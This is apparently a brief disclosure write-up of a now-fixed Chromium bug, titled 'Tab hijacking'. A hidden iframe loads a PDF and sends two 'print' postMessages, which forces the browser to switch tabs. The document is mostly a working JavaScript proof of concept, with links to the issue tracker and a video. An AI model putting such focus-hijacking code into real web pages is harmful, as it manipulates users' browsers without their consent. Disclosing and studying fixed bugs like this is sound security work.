---
title: Tab hijacking (Fixed)
---

When sending a `print` postMessage twice to the PDF viewer API, it would force the user to switch to that tab.

```js
let f = document.createElement('iframe');
f.hidden = true;
f.src =
  'https://www.w3.org/WAI/ER/tests/xhtml/testfiles/resources/pdf/dummy.pdf';
document.body.appendChild(f);
setTimeout((_) => {
  f.contentWindow[0].postMessage({type: 'print'}, '*');
  f.contentWindow[0].postMessage({type: 'print'}, '*');
  setTimeout(location.reload(), 100);
}, 100);
```

This issue was fixed in <https://issues.chromium.org/40828189>

Video PoC: <https://www.youtube.com/watch?v=n28qodJ4hhk>
